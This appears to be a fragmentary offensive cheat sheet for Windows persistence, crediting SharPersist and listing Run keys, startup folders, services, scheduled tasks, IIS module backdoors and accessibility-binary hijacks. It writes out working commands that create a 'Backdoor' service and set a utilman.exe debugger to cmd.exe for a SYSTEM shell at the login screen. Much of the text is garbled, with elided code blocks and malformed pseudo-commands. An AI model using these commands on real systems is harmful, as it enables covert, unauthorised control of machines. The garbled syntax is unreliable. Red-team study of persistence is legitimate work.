...
BY: [@h4wkst3r](https://github.com/fireeye/SharPersist)
## Hide Your Binary
> Sets (+) clears (-) 
>Hidden-File-Attribute[HFA]; {if file, use attr [SET], [CLEAR], ATTR};
>MOD ATTR FOR FILE 
```ps1
...
```
### Registry HKCU
>Create REG_SZ.xml VALUE in [RUN]::key 
...
```
### Startup
$ script.bat in ["USER", "START"] \folder
```powershell
...
>bitsadmin /resume backdoor
```
## Serviceland, IIS Raid – Backdooring IIS Using Native Modules
```powershell
...
```
## Elevated, Registry HKLM
# Similar to HKCU. 
$ -create REG_SZ.xml \value\run-key\+HKLM/Software\Microsoft\Windows
```powershell
>Value name:  Backdoor
...
```
### Services Elevated
$ -create srvc.exe | Auto-Start
```Powershell
>New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "默认。有效载荷。跑步" -StartupType Automatic
>sc start pentestlab
# SharPersist
$ -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
# sc
...
$ -spawn -process -schedule -task --taskeng.exe | Parent_Node.js
```powershell
...
>>>import Metasploit::`use post/windows/manage/sticky_keys`
#### Binary Replacement on Windows 10+
> -xploit *runtime.dll \vuln*osk.exe 
# On-Screen Keyboard **osk.exe** executable.
$ -create **HID.dll
$ `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
### RDP Backdoor...utilman.exe
[+]login screen, Windows Key+U --git cmd.exe window/SYSTEM.
```powershell
>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```
#### sethc.exe
// SMASH F5 for RDP login screen.
```powershell
...
# 4 – View Session without user’s permission. Allowing remote connections to this computer
